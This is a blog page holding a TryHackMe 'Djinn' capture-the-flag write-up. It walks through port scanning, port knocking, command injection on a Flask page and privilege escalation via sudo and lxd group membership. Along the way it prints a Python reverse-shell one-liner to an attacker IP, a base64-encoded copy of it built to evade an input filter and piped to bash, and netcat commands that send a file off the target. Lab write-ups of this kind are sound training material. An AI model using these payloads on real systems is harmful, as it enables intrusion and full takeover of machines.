<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="icon" type="image/png" href="/favicon.png">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
  <script src="/dist/mark.min.js" charset="UTF-8"></script>
<title>TryHackMe - Djinn writeup &mdash; fmash16's blog</title>
<meta property="og:title" content="TryHackMe - Djinn Writeup" />
      <meta property="og:description" content="An intermediate level box having an implentation of flask. Needs some python scripting and port knocking to get user. Root privilege escalation using lxc container for user with lxd group membership." />
      <meta property="og:type" content="article" />
      <meta property="og:url" content="github" />
      <meta property="og:image" content="/img/tryhackme_djinn/card.png" />

</head>

<body>
  <!-- Side navigation -->
	<div class="sidebar">
    <div class="vertical-center">
      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
      <p style="text-align:center; color:#eee">
      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
      <p style="text-align:center;font-size:20px">
        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
      </p>
    </div>
	</div>

<article>
<h1 id="tryhackme---djinn-writeup">TryHackMe - Djinn writeup</h1>
<div class="figure">
<img src="/img/tryhackme_djinn/card.png" />

</div>
<p>We add the machine IP to out /etc/hosts file</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> <span class="st">&quot;10.10.248.62 djinn.thm&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</code></pre></div>
<h1 id="nmap-scan">Nmap Scan</h1>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> -sC -sV -sS -oN nmap.out djinn.thm
<span class="fu">nmap</span> -Pn -p- djinn.thm</code></pre></div>
<p>Open ports:</p>
<ul>
<li>21/tcp open ftp vsftpd 3.0.3</li>
<li>22/tcp filtered ssh</li>
<li>1337/tcp open waste</li>
<li>7331/tcp open swx</li>
</ul>
<h1 id="enumeration">Enumeration</h1>
<h2 id="ftp--port-21">ftp -port 21</h2>
<p>ftp allows anonymous login. So we login with username <code>anonymous</code> and null password. Found 3 files. Contents are as following</p>
<ul>
<li>creds.txt :</li>
</ul>
<p><code>nitu:81299</code></p>
<p>SSH creds? Lets try ssh-ing into the box</p>
<div class="figure">
<img src="/img/tryhackme_djinn/2.png" />

</div>
<p>We get a connection refused. So the port is closed for now.</p>
<ul>
<li>game.txt :</li>
</ul>
<p><code>oh and I forgot to tell you I've setup a game for you on port 1337. See if you   can reach to the   final level and get the prize.</code></p>
<p>A service running on port 1337.</p>
<ul>
<li>message.txt :</li>
</ul>
<p><code>@nitish81299 I am going on holidays for few days, please take care of all the   work.   And don't mess up anything.</code></p>
<h2 id="port-1337">Port 1337</h2>
<p>We try connecting to the port 1337 with nc</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> djinn.thm 1337</code></pre></div>
<p>And we get a &quot;game&quot; that tells us that we can get our gift after 1000 successful simple maths.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/1.png" />

</div>
<h1 id="winning-the-game">Winning the game</h1>
<p>In order to win the game, lets write a simple python script that will perform and submit the 1000 calucultaions for us. We will be using pwntools for this. It can be installed using</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> apt-get install python-pwntools</code></pre></div>
<p>Our python script stands as follows:</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co">#! /usr/bin/env python</span>

<span class="im">import</span> sys
<span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span>

<span class="kw">def</span> solve(hostname, port):
    conn <span class="op">=</span> remote(hostname, port)
    banner <span class="op">=</span> conn.recvuntil(b<span class="st">&quot;gift.</span><span class="ch">\n</span><span class="st">&quot;</span>)
    problem <span class="op">=</span> (conn.recvline()).decode()
    <span class="bu">print</span>(problem)
    count <span class="op">=</span> <span class="dv">1</span>

    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1001</span>):
        var1 <span class="op">=</span> <span class="bu">int</span>(problem.split(<span class="st">&quot;, &quot;</span>)[<span class="dv">0</span>][<span class="dv">1</span>:])
        var2 <span class="op">=</span> <span class="bu">int</span>(problem.split(<span class="st">&quot;, &quot;</span>)[<span class="dv">2</span>][:<span class="op">-</span><span class="dv">2</span>])
        op <span class="op">=</span> problem.split(<span class="st">&quot;, &quot;</span>)[<span class="dv">1</span>][<span class="dv">1</span>]
        <span class="cf">if</span> op<span class="op">==</span><span class="st">&quot;/&quot;</span>:
            content <span class="op">=</span> <span class="bu">str</span>(var1<span class="op">/</span>var2)
        <span class="cf">elif</span> op<span class="op">==</span><span class="st">&quot;*&quot;</span>:
            content <span class="op">=</span> <span class="bu">str</span>(var1<span class="op">*</span>var2)
        <span class="cf">elif</span> op<span class="op">==</span><span class="st">&quot;+&quot;</span>:
            content <span class="op">=</span> <span class="bu">str</span>(var1<span class="op">+</span>var2)
        <span class="cf">elif</span> op<span class="op">==</span><span class="st">&quot;-&quot;</span>:
            content <span class="op">=</span> <span class="bu">str</span>(var1<span class="op">-</span>var2)
        <span class="bu">print</span>(content <span class="op">+</span> <span class="st">&quot;-----------------------&quot;</span> <span class="op">+</span> <span class="bu">str</span>(count))
        conn.send((content<span class="op">+</span><span class="st">&quot;</span><span class="ch">\r\n</span><span class="st">&quot;</span>).encode())
        <span class="cf">if</span> count <span class="op">==</span> <span class="dv">1001</span>:
            <span class="cf">while</span> <span class="va">True</span>:
                <span class="bu">print</span>(conn.recvline())
        <span class="cf">else</span>:
            data <span class="op">=</span> conn.recvline().decode()
            <span class="bu">print</span>(data)
            problem <span class="op">=</span> data[<span class="dv">2</span>:]
            count <span class="op">=</span> count <span class="op">+</span><span class="dv">1</span>

<span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:
    hostname <span class="op">=</span> sys.argv[<span class="dv">1</span>]
    port <span class="op">=</span> <span class="bu">int</span>(sys.argv[<span class="dv">2</span>])
    solve(hostname, port)</code></pre></div>
<p>We run this script and wait for our gift.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python</span> solve.py 10.10.248.62 1337</code></pre></div>
<p>And we get our gift</p>
<div class="figure">
<img src="/img/tryhackme_djinn/3.png" />

</div>
<p>These seem like port numbers: 1356, 6784, 3409</p>
<h1 id="port-knock">Port knock</h1>
<p>This was new to me. Port knocking adds extra security against mass port scans. As per wikipedia, &quot;In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s). A variant called single packet authorization (SPA) exists, where only a single &quot;knock&quot; is needed, consisting of an encrypted packet. The primary purpose of port knocking is to prevent an attacker from scanning a system for potentially exploitable services by doing a port scan, because unless the attacker sends the correct knock sequence, the protected ports will appear closed. &quot;</p>
<p>So if we knock on a certain set of ports in a certain serial, it can open another port running a service. Now we saw before in out nmap scan that port 22 for SSH was &quot;filtered&quot;. Meaning nmap could not determine the state of the port and it can be either open or closed. As we tried to ssh into the box, we got a closed port. So maybe through knocking the ports in the seiral gotten from the port 1337 game, we can get the ssh port to open?</p>
<p>We try the knocking using this simple bash loop that knocks the ports using nmap</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">for</span> <span class="ex">ip</span> in 1356, 6784, 3409<span class="kw">;</span> <span class="kw">do</span> <span class="fu">nmap</span> -Pn -p <span class="va">$ip</span> djinn.thm<span class="kw">;</span> <span class="kw">done</span></code></pre></div>
<p>Now we can connect to port 22! But we see that the creds found in the ftp are not correct. We get a permission denied with the ftp found creds.</p>
<h1 id="port-7331-enum">Port 7331 enum</h1>
<p>Lets have a look at this port. Netcating it, we don't receive anything, but we connect to it. We go to the port on browser and find a web server running.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/4.png" />

</div>
<p>The page doesn't have any functionality.</p>
<h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
<p>We fuzz the URI using ffuf</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ffuf</span> -c -w /usr/share/dirbuster/directory-list-2.3-medium.txt -u \
    http://djinn.thm:7331/FUZZ -e .txt,.php</code></pre></div>
<p>We find two pages:</p>
<ul>
<li>/wish</li>
<li>/genie</li>
</ul>
<p>Going over to http://djinn.thm:7331/wish we find</p>
<div class="figure">
<img src="/img/tryhackme_djinn/5.png" />

</div>
<h2 id="remote-code-executeion">Remote Code Executeion</h2>
<p>So we have some sort of RCE here. We input a command <code>id</code> and get redirected to the following URL</p>
<pre><code>http://djinn.thm:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</code></pre>
<h2 id="reverse-shell-www-data">Reverse shell (www-data)</h2>
<p>So the output of the command gets passed into the &quot;name&quot; var of the /genie page. Lets try getting a reverse shell with python</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python</span> -c <span class="st">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.17.253&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></code></pre></div>
<p>And we get redirected to the following</p>
<pre><code>http://djinn.thm:7331/genie?name=Wrong+choice+of+words</code></pre>
<p>&quot;Wrong choice of words&quot;. There appears to be some filtering of the user supplied input here. Lets try base64 encoding our payload and then passing it to bash as follows:</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python</span> -c \
<span class="st">&#39;import socket,subprocess,os;\</span>
<span class="st">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</span>
<span class="st">s.connect((\&quot;10.9.17.253\&quot;,1234));\</span>
<span class="st">os.dup2(s.fileno(),0);\</span>
<span class="st">os.dup2(s.fileno(),1);\ </span>
<span class="st">os.dup2(s.fileno(),2);\</span>
<span class="st">p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]); | base64&#39;</span></code></pre></div>
<p>And we get our encoded payload. Now we pass this payload, decode it and execute it on the box. We pass the following cmd:</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span>
<span class="ex">cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOS4xNy4yNTMiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK</span>
<span class="kw">|</span>
<span class="ex">base64</span> -d <span class="kw">|</span> <span class="fu">bash</span></code></pre></div>
<p>We open a nc listener on port 1234 and get a shell back.</p>
<h1 id="privilege-escalation-user-nitish">Privilege escalation : User nitish</h1>
<p>Looking around the machine, we find two users under the home directory:</p>
<ul>
<li>nitish</li>
<li>sam</li>
</ul>
<p>In the home directory of the user nitish, we find a hidden directory &quot;.dev&quot; that contains a file creds.txt. The file gives us the creds for the user nitish</p>
<pre><code>nitish:p4************n9</code></pre>
<p>Now we can login as nitish to the box using ssh.</p>
<h1 id="privilege-escalation-user-sam">Privilege Escalation : User sam</h1>
<p>Checking for the sudo permissions of the user with <code>sudo -l</code>, we find the following</p>
<div class="figure">
<img src="/img/tryhackme_djinn/6.png" />

</div>
<p>So the user can execute <code>/usr/bin/genie</code> as the user sam. So we run</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> -u sam /usr/bin/genie</code></pre></div>
<p>This prints us the usage</p>
<p>We can print the help message using <code>-h</code> tag</p>
<div class="figure">
<img src="/img/tryhackme_djinn/8.png" />

</div>
<p>Let's look if we can find some source for the program genie using find</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">find</span> / -name <span class="st">&quot;*genie*&quot;</span> <span class="op">2&gt;</span>/dev/null</code></pre></div>
<p>And we find the following</p>
<div class="figure">
<img src="/img/tryhackme_djinn/9.png" />

</div>
<p>We find that there is a man page for genie. Let's have a look at it.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/10.png" />

</div>
<p>We see that we can get a shell with the -p tag and execute any command using the &quot;-cmd&quot; tag. And we see that the program runs as sam SUID. So let's run the following and see what happens</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> -u sam /usr/bin/genie -p /bin/bash -cmd ls</code></pre></div>
<p>And we get a shell as user sam.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nitish@djinn</span>:~$ sudo -u sam /usr/bin/genie -p /bin/bash -cmd ls
<span class="ex">my</span> man!!
$ <span class="fu">id</span>
<span class="va">uid=</span>1000<span class="va">(</span>sam<span class="va">)</span> <span class="va">gid=</span>1000<span class="va">(</span>sam<span class="va">)</span>
<span class="va">groups=</span>1000<span class="va">(</span>sam<span class="va">)</span>,4<span class="va">(</span>adm<span class="va">)</span>,24<span class="va">(</span>cdrom<span class="va">)</span>,30<span class="va">(</span>dip<span class="va">)</span>,46<span class="va">(</span>plugdev<span class="va">)</span>,108<span class="va">(</span>lxd<span class="va">)</span>,113<span class="va">(</span>lpadmin<span class="va">)</span>,114<span class="va">(</span>sambashare<span class="va">)</span>
$</code></pre></div>
<h1 id="privilege-escalation---root">Privilege Escalation - Root</h1>
<h2 id="first-way---sudo-permissions">First way - sudo permissions</h2>
<p>Checking for sudo permissions for the user sam, we find the following</p>
<div class="figure">
<img src="/img/tryhackme_djinn/11.png" />

</div>
<p>So running the following as su we get the following prompt:</p>
<div class="figure">
<img src="/img/tryhackme_djinn/12.png" />

</div>
<p>The other options does not seem to give us much. So we have to somehow guess the correct number. Let's see if we can find some source.</p>
<p>In the home directory of the user sam , we find a file name &quot;.pyc&quot;. This is supposed to be a <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiQycD6nbjqAhUSXnwKHUckBHcQFjALegQIBhAB&amp;url=https%3A%2F%2Fwww.tutorialspoint.com%2FWhat-are-pyc-files-in-Python&amp;usg=AOvVaw1Za-3VtLAN7SSMzbKL7Cwp">python byte compiled file</a></p>
<p>We transfer the file to our local machine with netcat</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> 10.9.17.253 8888 <span class="op">&lt;</span> .pyc      # On target
<span class="ex">nc</span> -lnvp 8888 <span class="op">&gt;</span> program.pyc     # On host</code></pre></div>
<p>We can decompile the pyc file using <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj8kouwnrjqAhUi7XMBHXczBBAQFjAAegQIAhAB&amp;url=https%3A%2F%2Fpypi.org%2Fproject%2Funcompyle6%2F&amp;usg=AOvVaw0K90ryNJluPxJukPv2rzBo">uncompyle6</a></p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">uncompyle6</span> program.pyc <span class="op">&gt;</span> program.py</code></pre></div>
<p>The decompiled program is as follows:</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co"># uncompyle6 version 3.7.2</span>
<span class="co"># Python bytecode 2.7 (62211)</span>
<span class="co"># Decompiled from: Python 3.8.3 (default, May 17 2020, 18:15:42)</span>
<span class="co"># [GCC 10.1.0]</span>
<span class="co"># Embedded file name: /home/mzfr/scripts/exp.py</span>
<span class="co"># Compiled at: 2019-11-07 13:05:18</span>
<span class="im">from</span> getpass <span class="im">import</span> getuser
<span class="im">from</span> os <span class="im">import</span> system
<span class="im">from</span> random <span class="im">import</span> randint

<span class="kw">def</span> naughtyboi():
    <span class="bu">print</span> <span class="st">&#39;Working on it!! &#39;</span>


<span class="kw">def</span> guessit():
    num <span class="op">=</span> randint(<span class="dv">1</span>, <span class="dv">101</span>)
    <span class="bu">print</span> <span class="st">&#39;Choose a number between 1 to 100: &#39;</span>
    s <span class="op">=</span> <span class="bu">input</span>(<span class="st">&#39;Enter your number: &#39;</span>)
    <span class="cf">if</span> s <span class="op">==</span> num:   <span class="op">&lt;=====================================================</span>
        system(<span class="st">&#39;/bin/sh&#39;</span>)
    <span class="cf">else</span>:
        <span class="bu">print</span> <span class="st">&#39;Better Luck next time&#39;</span>


<span class="kw">def</span> readfiles():
    user <span class="op">=</span> getuser()
    path <span class="op">=</span> <span class="bu">input</span>(<span class="st">&#39;Enter the full of the file to read: &#39;</span>)
    <span class="bu">print</span> <span class="st">&#39;User </span><span class="sc">%s</span><span class="st"> is not allowed to read </span><span class="sc">%s</span><span class="st">&#39;</span> <span class="op">%</span> (user, path)


<span class="kw">def</span> options():
    <span class="bu">print</span> <span class="st">&#39;What do you want to do ?&#39;</span>
    <span class="bu">print</span> <span class="st">&#39;1 - Be naughty&#39;</span>
    <span class="bu">print</span> <span class="st">&#39;2 - Guess the number&#39;</span>
    <span class="bu">print</span> <span class="st">&#39;3 - Read some damn files&#39;</span>
    <span class="bu">print</span> <span class="st">&#39;4 - Work&#39;</span>
    choice <span class="op">=</span> <span class="bu">int</span>(<span class="bu">input</span>(<span class="st">&#39;Enter your choice: &#39;</span>))
    <span class="cf">return</span> choice


<span class="kw">def</span> main(op):
    <span class="cf">if</span> op <span class="op">==</span> <span class="dv">1</span>:
        naughtyboi()
    <span class="cf">elif</span> op <span class="op">==</span> <span class="dv">2</span>:
        guessit()
    <span class="cf">elif</span> op <span class="op">==</span> <span class="dv">3</span>:
        readfiles()
    <span class="cf">elif</span> op <span class="op">==</span> <span class="dv">4</span>:
        <span class="bu">print</span> <span class="st">&#39;work your ass off!!&#39;</span>
    <span class="cf">else</span>:
        <span class="bu">print</span> <span class="st">&#39;Do something better with your life&#39;</span>


<span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:
    main(options())
<span class="co"># okay decompiling lago.pyc</span></code></pre></div>
<p>So this is the source of the /root/lago file that we have the run permissions for. Analyzing the source, we see that the number supplied is comapared with a number generated randomly. Anyway, randomly trying to enter the word &quot;num&quot; as the number, we succeed! Couldn't figure out why that happened though. Will update as soon as I figure it out.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/13.png" />

</div>
<h2 id="second-cooler-way-lxc-container">Second (Cooler) way : lxc container</h2>
<p>Looking at the box a bit more, I had a look at the group memberships of the the user sam and found that the user is a member of the group <code>lxd</code> !</p>
<p>We can privesc a member of the group to root easily using this. This method has been explained really well in <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">hackingarticles</a></p>
<p>So we download and build the alpine linux image on our host as follows:</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">git</span> clone  https://github.com/saghul/lxd-alpine-builder.git
<span class="bu">cd</span> lxd-alpine-builder
<span class="ex">./build-alpine</span></code></pre></div>
<p>We get the build image <code>alpine-v3.12-x86_64-20200706_0859.tar.gz</code>. Now we need to transfer this file to the target machine. So lets fire up a python http server</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python3</span> -m http.server</code></pre></div>
<p>On the target, we download the build lxc image</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">wget</span> http://10.9.17.253:8000/alpine-v3.12-x86_64-20200706_0859.tar.gz</code></pre></div>
<p>Now let's add this image to the lxd list</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz --alias pwn</code></pre></div>
<p>We got a permission denied saying that we cannot write to /home/nitish/.config. So our home directory is not right. So we run the following</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">export</span> <span class="va">HOME=</span>/home/sam
<span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz --alias pwn
<span class="ex">lxc</span> image list</code></pre></div>
<p>And now we succeed.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/14.png" />

</div>
<p>Now we run the following to get root. We also need to create a storage additionaly here as follows.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">lxc</span> storage create my-storage dir
<span class="ex">lxc</span> profile device add default root disk path=/ pool=my-storage</code></pre></div>
<p>Then</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">lxc</span> init pwn ignite -c security.privileged=true
<span class="ex">lxc</span> config device add ignite mydevice disk source=/ path=/mnt/root \
recursive=true
<span class="ex">lxc</span> start ignite
<span class="ex">lxc</span> exec ignite /bin/sh
<span class="fu">id</span></code></pre></div>
<p>And we got root!</p>
<div class="figure">
<img src="/img/tryhackme_djinn/15.png" />

</div>
<p>In order to get the root flag, we go to <code>/mnt/root/root</code> and find an executable proof.sh, we run it to get our flag.</p>
<div class="figure">
<img src="/img/tryhackme_djinn/16.png" />

</div>
</article>

<footer>
  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
  <i class="far fa-copyright"></i> 2020-2020 </p>
</footer>
</body>
